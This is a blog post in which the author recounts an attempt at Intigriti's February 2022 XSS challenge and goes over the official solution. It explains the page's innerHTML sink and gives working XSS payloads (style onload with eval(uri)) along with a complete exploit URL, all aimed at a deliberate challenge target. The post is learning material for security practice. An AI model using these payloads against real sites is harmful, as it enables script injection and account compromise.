---
title: "Intigriti 0222 XSS Challenge Attempt"
date: 2022-02-19T10:59:07-08:00
slug: intigriti-0222-challenge-attempt
description: My attempt to solve the intigriti 0222 xss challenge
image: images/0222-challenge/og.png
tags:
  - javascript
  - xss
  - intigriti
type: post
---

## Intro

Intigriti is a hacking and bug bounty platform. They host a monthly XSS challenge. They are really fun and interesting for someone like me. 

TL;DR, I did not complete this month's challenge. 😭


See

* Challenge: https://challenge-0222.intigriti.io/challenge/xss.html
* Intigriti explanation: https://www.youtube.com/watch?v=P1bFG2qMxec


## My attempt

Even though I did not complete the challenge, I thought I would document what my thought process were and what I've learned. 

### Challenge 

The page has a form with a name input and a toggle. The instruction says the name cannot be empty nor can it be longer than 24 characters.
Let's try it. Enting the name will trigger a dialog popup with the name from the input field. 

 |
:-------------------------:|:-------------------------:
![](/images/0222-challenge/form.png)  |  ![](/images/0222-challenge/popup.png)


First thing I noticed is that the uri changed with `q` and `first` query parameters. It seems like I can manipulate these parameter to cause a XSS attack. Let's see how the parameters are appended. Looking at the source code we can see that it is set directly to the `window.location.search` property. The value is uri encoded.

```js
 window['main-form'].onsubmit = function(e) {
    e.preventDefault()
    var inputName = window['name-field'].value
    var isFirst = document.querySelector('input[type=radio]:checked').value
    if (!inputName.length) {
        showModal('Error!', "It's empty")
        return
    }

    if (inputName.length > 24) {
        showModal('Error!', "Length exceeds 24, keep it short!")
        return
    }

    window.location.search = "?q=" + encodeURIComponent(inputName) + '&first=' + isFirst
}
```

When the page is loaded, what happens to the query parameters?

```js
function showModal(title, content) {
    var titleDOM = document.querySelector('#main-modal h3')
    var contentDOM = document.querySelector('#main-modal p')
    titleDOM.innerHTML = title
    contentDOM.innerHTML = content
    window['main-modal'].classList.remove('hide')
}

// onsubmit code...

if (location.href.includes('q=')) {
    var uri = decodeURIComponent(location.href)
    var qs = uri.split('&first=')[0].split('?q=')[1]
    if (qs.length > 24) {
    showModal('Error!', "Length exceeds 24, keep it short!")
    } else {
    showModal('Welcome back!', qs)
    }
}
```

First thing I noticed is the `innerHTML` assignment. The `innerHTML` gets or sets the HTML content within the element. It is not uncommon to use `innerHTML` to set the content. This leaves vulnerability valunerbility to XSS attackers. Let's try it

```
https://challenge-0222.intigriti.io/challenge/xss.html?q=<script>alert()</script>&first=yes
```

Nothing happens? Why? Because HTML5 specifies that a `<script>` tag inserted with `innerHTML` should not execute. [See MDN\' security consideration](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations).

But even in the section, it says it does not prevent all the attacks. The most common one is to use `img` with `onerror` field.

```
<img src=# onerror=alert(1) />
```

But this exceeds the character limit. 🤔. This is where I was stuck. I looked up some small xss methods and eventually found the `onload` property in `style` tag. 

```
<style onload=alert(1)>
```

{{<figure src="/images/0222-challenge/alert.png" alt="A screenshot of the alert(1)" width="50%" >}}

Yay, I got an alert popup. But this is not the objective of the challenge. I need to get `alert(document.domain)`. I spent a couple more days on this challenge and could not find the answers.I tried to see if there is a way maybe I can use a tiny url to load some bad script. But no way I can pass below the 24 characters limit.


## Answer

1 week passed by and Integriti posted their answers. I was really curious on how they by-passed the 24 characters limit. Go watch the video solution because they can explain way better than I did.

### Solution

The method they by pass is to use one of the tiny xss payload [from this github repo](https://github.com/terjanq/Tiny-XSS-Payloads).

Alright, the answer is to use `eval` to execute some js statements, which causes a XSS attack.

```
<style/onload=eval(name)>
```

But what variable do we control in the `showModal` function? Everything is either passed in as arguments, or the `name` in the `window` global object.

### The simple trick 

The key is `var` 🤦‍♀️. Once I saw the solution, it dawn upon me!! `var` variables hoist up in the scope. Since the scope is the window itself, it is accessible in any function!

See more about [\`var\` hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting#var_hoisting).


So we can access the `uri` variable defined in the `if` block.
```
<style/onload=eval(uri)>
```

### More

But this is not the using above payload, you will see an error. `Uncaught SyntaxError: expected expression, got end of script`. Because the uri content is not actually anything of JavaScript statement.

To complete the challenge, we need to get some valid js statement into the `eval` parameter. We can try terminating the previous statement with `;` and have valid syntax afterwards. 

`https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&first=no&;alert(document.domain)`

This didn't work. But `eval` also works with multiline js statements. Let's try that. What is the new line character in encoded URI format: `%0A`.

`https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&first=no&%0Aalert(document.domain)`

{{<figure src="/images/0222-challenge/complete.png" alt="XSS successful" width="50%" >}}

## Thoughts

I think this challenge is awesome. It combines a couple simple JavaScript quirkiness to create a surprising bypass. The variable hoisting and the `eval` keyword. 2 things I already knew but did not think of during the challenge. Looking forward to March's challenge.

## Things I learned

* `innerHTML` does not execute `script` tag
* [This awesome tiny xss payload repo](https://github.com/terjanq/Tiny-XSS-Payloads)
* `/` act as spaces in HTML tags. Very cool
